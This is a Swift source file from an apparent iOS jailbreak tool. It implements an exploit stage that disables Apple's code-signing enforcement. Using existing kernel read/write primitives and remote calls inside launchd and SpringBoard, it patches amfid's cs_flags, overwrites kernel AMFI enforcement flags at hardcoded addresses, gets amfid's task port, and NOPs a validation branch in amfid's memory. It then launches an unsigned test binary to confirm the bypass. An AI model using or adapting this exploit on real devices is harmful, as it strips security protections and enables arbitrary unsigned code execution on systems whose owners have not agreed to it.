//
//  exp_amfid_nop_final.swift
//  DSPloit
//
//  FINAL EXPERIMENT: amfid NOP patch via task_for_pid from launchd
//  ═══════════════════════════════════════════════════════════════════
//
//  This is the CLEAN, RELIABLE approach combining all learnings:
//
//  1. Find amfid PID via sysctl (userspace — no kernel proc walk needed!)
//  2. Patch amfid's cs_flags via C code (procbypid works from our_proc)
//  3. task_for_pid from launchd (uid=0, has task_for_pid-allow)
//  4. mach_vm_region → find amfid's __TEXT base (ASLR slide)
//  5. mach_vm_protect → make __TEXT writable
//  6. mach_vm_read_overwrite → verify cbz instruction
//  7. mach_vm_write → NOP the cbz at offset 0x2ec8
//  8. Test spawn unsigned binary
//
//  WHY THIS WORKS:
//  - sysctl KERN_PROC works from any process (no kernel walk needed)
//  - procbypid() in C starts from our_proc (valid, no PAC issues)
//  - launchd has uid=0 + task_for_pid-allow entitlement
//  - amfid's __TEXT is userspace memory (no PPL/KTRR protection)
//  - mach_vm_protect can make userspace pages writable
//  - Once cbz→NOP, ALL binaries pass AMFI validation
//
//  SAFETY:
//  - No page table walk (caused panic before)
//  - No PAC pointer stripping needed
//  - No kernel __TEXT writes
//  - If anything fails, amfid continues running normally
//
//  Created by Royan | 2026-05-30
//

import Foundation
import CommonCrypto

final class ExpAmfidNopFinal {
    static let shared = ExpAmfidNopFinal()
    var onLog: ((String) -> Void)?
    
    // amfid patch target: cbz w22, 0x100002f74 at file offset 0x2ec8
    // Bytes: 76 05 00 34
    // NOP:   1F 20 03 D5
    private let patchFileOffset: UInt64 = 0x2ec8
    private let expectedCbzBytes: UInt32 = 0x34000576  // cbz w22, +0xA8 (little-endian)
    private let nopInstruction: UInt32 = 0xD503201F
    
    private func log(_ msg: String) {
        DispatchQueue.main.async { self.onLog?(msg) }
        globallogger.log("(amfid_final) \(msg)")
    }
    
    // MARK: - Main Entry Point
    
    func runAll() -> [String] {
        var output: [String] = []
        func out(_ s: String) { output.append(s); log(s) }
        
        guard ds_is_ready() else { return ["❌ KRW not active"] }
        
        out("══════════════════════════════════════════")
        out("  amfid NOP Patch (Final — Safe Path)")
        out("══════════════════════════════════════════")
        out("")
        out("Target: cbz w22,0x100002f74 → NOP")
        out("Method: sysctl → procbypid → task_for_pid → vm_write")
        out("")
        
        // ─── Step 1: Find amfid PID via sysctl ───
        out("[1/7] Finding amfid via sysctl...")
        let amfidPid = findAmfidPidViaSysctl()
        
        if amfidPid <= 0 {
            out("❌ amfid not found via sysctl")
            out("   Trying to trigger amfid spawn...")
            triggerAmfidSpawn()
            let retry = findAmfidPidViaSysctl()
            if retry <= 0 {
                out("❌ amfid still not found — may be kernel-embedded (TXM)")
                return output
            }
            out("✅ amfid found after trigger: PID \(retry)")
        } else {
            out("✅ amfid PID = \(amfidPid)")
        }
        
        let finalPid = amfidPid > 0 ? amfidPid : findAmfidPidViaSysctl()
        guard finalPid > 0 else { return output }
        out("")
        
        // ─── Step 2: Patch amfid cs_flags via kernel ───
        out("[2/7] Patching amfid cs_flags (allow task_for_pid)...")
        let amfidProc = procbypid(finalPid)
        if amfidProc == 0 {
            out("❌ procbypid(\(finalPid)) returned 0")
            out("   C proc walker failed — proc list may be corrupted")
            return output
        }
        out("amfid kernel proc: 0x\(String(format: "%llx", amfidProc))")
        
        // Patch cs_flags to allow debugging + task_for_pid
        let patched = amfi_bypass_patch_csflags(amfidProc)
        out(patched ? "✅ cs_flags patched" : "⚠️ cs_flags patch failed (PPL) — continuing anyway")
        
        // Also disable exc_guard on amfid's task
        let amfidTask = taskbyproc(amfidProc)
        if amfidTask != 0 {
            let excGuard = ds_kread32(amfidTask + UInt64(off_task_task_exc_guard))
            if excGuard != 0 {
                ds_kwrite32(amfidTask + UInt64(off_task_task_exc_guard), 0)
                out("✅ exc_guard disabled (was 0x\(String(format:"%x", excGuard)))")
            }
        }
        out("")
        
        // ─── Step 3: Set global kernel flags ───
        out("[3/7] Setting kernel enforcement flags...")
        let slide = ds_get_kernel_slide()
        
        // cs_enforcement_disable = 1
        ds_kwrite32(0xfffffff00a160798 &+ slide, 1)
        let csVal = ds_kread32(0xfffffff00a160798 &+ slide)
        out("cs_enforcement_disable = \(csVal) \(csVal == 1 ? "✅" : "❌")")
        
        // Zero AMFI enforcement flags
        let amfiBase: UInt64 = 0xfffffff00a330098 &+ slide
        for off: UInt64 in [0x110, 0x160, 0x1b0, 0x200, 0x250, 0x2a0, 0x2f0, 0x340, 0x398, 0x408] {
            ds_kwrite64(amfiBase &+ off, 0)
        }
        out("AMFI 10 flags zeroed ✅")
        out("")
        
        // ─── Step 4-7: task_for_pid + patch via launchd ───
        out("[4/7] Connecting to launchd for task_for_pid...")
        out("(async — results below)")
        out("")
        
        // This part is async because RootExecutor connects to launchd
        performPatchViaLaunchd(amfidPid: finalPid)
        
        return output
    }
    
    // MARK: - Async Patch via Launchd
    
    #if !DISABLE_REMOTECALL
    private func performPatchViaLaunchd(amfidPid: Int32) {
        RootExecutor.shared.executeAsRoot(operation: "amfid_nop_final") { [self] rc in
            // ─── Step 4: task_for_pid ───
            let portAddr = rc.trojanMem + 0x100
            rc[portAddr].setValue32(0)
            
            let tfpRet = RootExecutor.rcall(rc, "task_for_pid",
                UInt64(mach_task_self_), UInt64(amfidPid), portAddr)
            let taskPort = rc[portAddr].value32()
            
            guard tfpRet == 0 && taskPort != 0 else {
                return (false, "[4] task_for_pid FAILED: ret=\(tfpRet) port=\(taskPort)", UInt64(tfpRet))
            }
            
            // ─── Step 5: mach_vm_region → find __TEXT ───
            let addrBuf = rc.trojanMem + 0x200
            let sizeBuf = rc.trojanMem + 0x208
            let infoBuf = rc.trojanMem + 0x210
            let cntBuf = rc.trojanMem + 0x280
            let objBuf = rc.trojanMem + 0x290
            
            // Start scanning from address 0x100000000 (typical Mach-O base)
            rc[addrBuf].setValue64(0x100000000)
            rc[sizeBuf].setValue64(0)
            rc[cntBuf].setValue32(9) // VM_REGION_BASIC_INFO_COUNT_64
            
            let regionRet = RootExecutor.rcall(rc, "mach_vm_region",
                UInt64(taskPort), addrBuf, sizeBuf, 9, infoBuf, cntBuf, objBuf)
            
            let textBase = rc[addrBuf].value64()
            let textSize = rc[sizeBuf].value64()
            
            guard regionRet == 0 else {
                return (false, "[5] mach_vm_region FAILED: ret=\(regionRet)", UInt64(regionRet))
            }
            
            guard textBase >= 0x100000000 && textBase < 0x280000000000 else {
                return (false, "[5] invalid text base: 0x\(String(textBase, radix:16))", textBase)
            }
            
            let patchAddr = textBase + self.patchFileOffset
            
            // ─── Step 6: mach_vm_protect → make writable ───
            let pageAddr = patchAddr & ~0xFFF
            let protRet = RootExecutor.rcall(rc, "mach_vm_protect",
                UInt64(taskPort), pageAddr, 0x4000, 0, 7) // VM_PROT_ALL = rwx
            
            guard protRet == 0 else {
                return (false, "[6] mach_vm_protect FAILED: ret=\(protRet) (text=0x\(String(textBase, radix:16)))", UInt64(protRet))
            }
            
            // ─── Step 6b: Read + verify cbz instruction ───
            let readBuf = rc.trojanMem + 0x300
            let readSzBuf = rc.trojanMem + 0x310
            rc[readSzBuf].setValue64(4)
            rc[readBuf].setValue32(0)
            
            let readRet = RootExecutor.rcall(rc, "mach_vm_read_overwrite",
                UInt64(taskPort), patchAddr, 4, readBuf, readSzBuf)
            let currentInsn = rc[readBuf].value32()
            
            guard readRet == 0 else {
                return (false, "[6b] mach_vm_read FAILED: ret=\(readRet)", UInt64(readRet))
            }
            
            // Verify it's a cbz instruction (0x34xxxxxx)
            guard (currentInsn & 0xFF000000) == 0x34000000 else {
                // Check if already patched (NOP)
                if currentInsn == 0xD503201F {
                    return (true, "✅ ALREADY PATCHED (NOP) at 0x\(String(patchAddr, radix:16))", 0)
                }
                return (false, "[6b] NOT cbz at 0x\(String(patchAddr, radix:16)): 0x\(String(format:"%08x", currentInsn)) (text=0x\(String(textBase, radix:16)) size=0x\(String(textSize, radix:16)))", UInt64(currentInsn))
            }
            
            // ─── Step 7: Write NOP ───
            let nopBuf = rc.trojanMem + 0x320
            rc[nopBuf].setValue32(0xD503201F) // NOP
            
            let writeRet = RootExecutor.rcall(rc, "mach_vm_write",
                UInt64(taskPort), patchAddr, nopBuf, 4)
            
            guard writeRet == 0 else {
                return (false, "[7] mach_vm_write FAILED: ret=\(writeRet)", UInt64(writeRet))
            }
            
            // Verify write
            rc[readBuf].setValue32(0)
            rc[readSzBuf].setValue64(4)
            RootExecutor.rcall(rc, "mach_vm_read_overwrite",
                UInt64(taskPort), patchAddr, 4, readBuf, readSzBuf)
            let verifyInsn = rc[readBuf].value32()
            
            if verifyInsn == 0xD503201F {
                return (true, "✅✅✅ PATCHED! cbz→NOP at 0x\(String(patchAddr, radix:16)) (base=0x\(String(textBase, radix:16)))", 0)
            } else {
                return (false, "[7] verify failed: wrote NOP but read 0x\(String(format:"%08x", verifyInsn))", UInt64(verifyInsn))
            }
        }
        
        // Poll for result and test spawn
        DispatchQueue.main.asyncAfter(deadline: .now() + 20) { [weak self] in
            guard let self else { return }
            if let r = RootExecutor.shared.lastResult, r.operation == "amfid_nop_final" {
                self.log("")
                self.log("═══ RESULT ═══")
                self.log(r.success ? "✅ \(r.message)" : "❌ \(r.message)")
                
                if r.success {
                    self.log("")
                    self.log("[TEST] Spawning unsigned binary...")
                    self.testUnsignedSpawn()
                }
            } else {
                self.log("⚠️ Timeout waiting for launchd result")
            }
        }
    }
    #else
    private func performPatchViaLaunchd(amfidPid: Int32) {
        log("❌ DISABLE_REMOTECALL — cannot use launchd")
    }
    #endif
    
    // MARK: - Test Unsigned Spawn
    
    #if !DISABLE_REMOTECALL
    private func testUnsignedSpawn() {
        guard let sb = dspmgr.shared.sbProc else {
            log("❌ No SpringBoard RC for spawn test")
            return
        }
        
        // Build minimal test binary (exit(0))
        let bin = buildMinimalBinary()
        let docs = FileManager.default.urls(for: .documentDirectory, in: .userDomainMask).first!.path
        let binPath = docs + "/amfid_final_test"
        try? bin.write(to: URL(fileURLWithPath: binPath))
        
        // chmod +x via SpringBoard
        let pathAddr = remote_alloc_str(sb, binPath)
        RootExecutor.rcall(sb, "chmod", pathAddr, 0o755)
        
        // posix_spawn from SpringBoard
        let pidAddr = sb.trojanMem + 0xA00
        sb[pidAddr].setValue32(0)
        let argv = sb.trojanMem + 0xA10
        sb[argv].setValue64(pathAddr)
        sb[argv + 8].setValue64(0)
        
        let ret = RootExecutor.rcall(sb, "posix_spawn", pidAddr, pathAddr, 0, 0, argv, 0)
        let pid = sb[pidAddr].value32()
        RootExecutor.rcall(sb, "free", pathAddr)
        
        log("posix_spawn → ret=\(ret) pid=\(pid)")
        
        if ret == 0 && pid != 0 {
            log("")
            log("╔══════════════════════════════════════╗")
            log("║  ✅✅✅ UNSIGNED BINARY SPAWNED!     ║")
            log("║  PID = \(pid)")
            log("║  🎉 FULL JAILBREAK ACHIEVED!        ║")
            log("╚══════════════════════════════════════╝")
        } else {
            log("")
            log("❌ Spawn still blocked: ret=\(ret)")
            log("   Possible causes:")
            log("   - amfid restarted (patch lost)")
            log("   - AMFI kernel check still active")
            log("   - Binary format issue")
            log("")
            log("   Try: tap again (amfid may have restarted)")
            
            // Also try from launchd (uid=0 context)
            log("")
            log("   Trying from launchd (uid=0)...")
            testSpawnFromLaunchd(binPath: binPath)
        }
    }
    
    private func testSpawnFromLaunchd(binPath: String) {
        RootExecutor.shared.executeAsRoot(operation: "test_spawn_root") { rc in
            let pathAddr = remote_alloc_str(rc, binPath)
            RootExecutor.rcall(rc, "chmod", pathAddr, 0o755)
            
            let pidAddr = rc.trojanMem + 0xA00
            rc[pidAddr].setValue32(0)
            let argv = rc.trojanMem + 0xA10
            rc[argv].setValue64(pathAddr)
            rc[argv + 8].setValue64(0)
            
            let ret = RootExecutor.rcall(rc, "posix_spawn", pidAddr, pathAddr, 0, 0, argv, 0)
            let pid = rc[pidAddr].value32()
            RootExecutor.rcall(rc, "free", pathAddr)
            
            if ret == 0 && pid != 0 {
                return (true, "✅ SPAWNED FROM LAUNCHD! PID=\(pid)", UInt64(pid))
            }
            return (false, "launchd spawn: ret=\(ret) pid=\(pid)", UInt64(ret))
        }
        
        DispatchQueue.main.asyncAfter(deadline: .now() + 12) { [weak self] in
            if let r = RootExecutor.shared.lastResult, r.operation == "test_spawn_root" {
                self?.log(r.success ? "✅ \(r.message)" : "❌ \(r.message)")
            }
        }
    }
    #endif
    
    // MARK: - Find amfid PID via sysctl (NO kernel walk needed!)
    
    private func findAmfidPidViaSysctl() -> Int32 {
        // Use sysctl KERN_PROC_ALL to list all processes
        // This is a userspace API — no kernel memory access needed
        var mib: [Int32] = [CTL_KERN, KERN_PROC, KERN_PROC_ALL, 0]
        var size: Int = 0
        
        // First call: get buffer size
        guard sysctl(&mib, 4, nil, &size, nil, 0) == 0 else { return -1 }
        
        // Allocate buffer
        let count = size / MemoryLayout<kinfo_proc>.stride
        var procs = [kinfo_proc](repeating: kinfo_proc(), count: count)
        
        // Second call: get data
        guard sysctl(&mib, 4, &procs, &size, nil, 0) == 0 else { return -1 }
        
        let actualCount = size / MemoryLayout<kinfo_proc>.stride
        
        for i in 0..<actualCount {
            let proc = procs[i]
            let name = withUnsafePointer(to: proc.kp_proc.p_comm) { ptr -> String in
                ptr.withMemoryRebound(to: CChar.self, capacity: Int(MAXCOMLEN)) { cStr in
                    String(cString: cStr)
                }
            }
            if name == "amfid" {
                return proc.kp_proc.p_pid
            }
        }
        
        return -1
    }
    
    /// Trigger amfid to spawn by attempting to exec a signed binary
    private func triggerAmfidSpawn() {
        #if !DISABLE_REMOTECALL
        if let sb = dspmgr.shared.sbProc {
            // Spawn /usr/bin/true — this triggers amfid to validate it
            let path = remote_alloc_str(sb, "/usr/bin/true")
            let pidAddr = sb.trojanMem + 0xB00
            sb[pidAddr].setValue32(0)
            let argv = sb.trojanMem + 0xB10
            sb[argv].setValue64(path)
            sb[argv + 8].setValue64(0)
            RootExecutor.rcall(sb, "posix_spawn", pidAddr, path, 0, 0, argv, 0)
            RootExecutor.rcall(sb, "free", path)
            usleep(500_000) // 500ms for amfid to start
        }
        #endif
    }
    
    // MARK: - Build Minimal Binary
    
    /// Minimal arm64 Mach-O that calls exit(0)
    /// This is the simplest possible binary — just syscall exit
    private func buildMinimalBinary() -> Data {
        // Mach-O header (arm64, MH_EXECUTE)
        var bin = Data()
        
        // MH_MAGIC_64, CPU_TYPE_ARM64, CPU_SUBTYPE_ALL, MH_EXECUTE, 2 load cmds
        bin.append(contentsOf: [
            0xCF, 0xFA, 0xED, 0xFE,  // magic
            0x0C, 0x00, 0x00, 0x01,  // cpu_type = ARM64
            0x00, 0x00, 0x00, 0x00,  // cpu_subtype
            0x02, 0x00, 0x00, 0x00,  // filetype = MH_EXECUTE
            0x02, 0x00, 0x00, 0x00,  // ncmds = 2
            0x60, 0x01, 0x00, 0x00,  // sizeofcmds
            0x00, 0x00, 0x00, 0x00,  // flags
            0x00, 0x00, 0x00, 0x00   // reserved
        ])
        
        // LC_SEGMENT_64 for __TEXT
        var seg = [UInt8](repeating: 0, count: 72)
        seg[0] = 0x19; seg[4] = 0x48  // cmd=LC_SEGMENT_64, cmdsize=72
        // segname = "__TEXT"
        seg[8] = 0x5F; seg[9] = 0x5F; seg[10] = 0x54; seg[11] = 0x45
        seg[12] = 0x58; seg[13] = 0x54
        // vmaddr = 0x100000000
        seg[24] = 0x00; seg[25] = 0x00; seg[26] = 0x00; seg[27] = 0x00
        seg[28] = 0x01
        // vmsize = 0x4000
        seg[32] = 0x00; seg[33] = 0x40
        // fileoff = 0
        // filesize = 0x4000
        seg[40] = 0x00; seg[41] = 0x40
        // maxprot = 5 (r-x)
        seg[48] = 0x05
        // initprot = 5 (r-x)
        seg[52] = 0x05
        bin.append(contentsOf: seg)
        
        // LC_UNIXTHREAD (entry point)
        var thr = [UInt8](repeating: 0, count: 280)
        thr[0] = 0x05  // cmd = LC_UNIXTHREAD
        thr[4] = 0x18; thr[5] = 0x01  // cmdsize = 280
        thr[8] = 0x06  // ARM_THREAD_STATE64
        thr[12] = 0x44 // count = 68 (uint32s)
        // PC (x32 in thread state) = 0x100000180
        thr[272] = 0x80; thr[273] = 0x01; thr[274] = 0x00; thr[275] = 0x00
        thr[276] = 0x01 // high byte of 0x100000180
        bin.append(contentsOf: thr)
        
        // Pad to entry point offset (0x180)
        while bin.count < 0x180 { bin.append(0) }
        
        // Code at 0x100000180: exit(0)
        // mov x0, #0        ; exit code = 0
        // mov x16, #1       ; syscall number = exit
        // svc #0x80         ; syscall
        bin.append(contentsOf: [
            0x00, 0x00, 0x80, 0xD2,  // mov x0, #0
            0x30, 0x00, 0x80, 0xD2,  // mov x16, #1
            0x01, 0x10, 0x00, 0xD4   // svc #0x80
        ])
        
        // Pad to page size
        while bin.count < 0x4000 { bin.append(0) }
        
        return bin
    }
}
